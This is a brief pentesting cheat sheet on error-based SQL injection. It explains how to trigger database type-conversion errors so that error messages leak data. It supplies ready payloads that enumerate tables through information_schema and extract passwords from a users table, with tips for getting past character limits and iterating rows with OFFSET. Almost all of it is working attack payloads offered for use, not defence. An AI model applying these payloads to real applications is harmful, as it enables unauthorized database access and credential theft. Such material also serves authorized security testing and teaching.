# SQLi: In-Band Error-Based Extraction (Visible)

**Category:** SQL Injection

**Sub-Category:** In-Band / Visible

**Logic:** Intentionally triggering a database error (like a Type Conversion error) to force the database to display sensitive data within the error message. Useful when `UNION` is blocked or input is truncated.

## Methodology

### 1. Trigger the Error

Test if the application displays database errors by sending a syntax breaker like a single quote `'`.

### 2. Force a Type Conversion (CAST)

Attempt to `CAST` a string (the data you want) into an integer. The database will error out and say: *"Cannot convert 'the_data' to integer."*

* **Generic:** `' AND 1=CAST((SELECT 'text') AS int)--`
* **PostgreSQL Short (Good for char limits):** `' AND 1=(SELECT 'text')::int--`

## Extraction Payloads

**Find Tables:**
`' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--`

**Dump Data (Users):**
`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

## Technical Caveats

* **Boolean Context:** If the app says "Boolean required," use the `1=CAST(...)` format to ensure the `AND` statement is valid.
* **Limit/Offset:** Since errors usually only show one result at a time, use `LIMIT 1 OFFSET 0`, then `OFFSET 1`, etc., to iterate through rows.
* **Character Limits:** Delete the original ID value from the parameter to save space for your payload.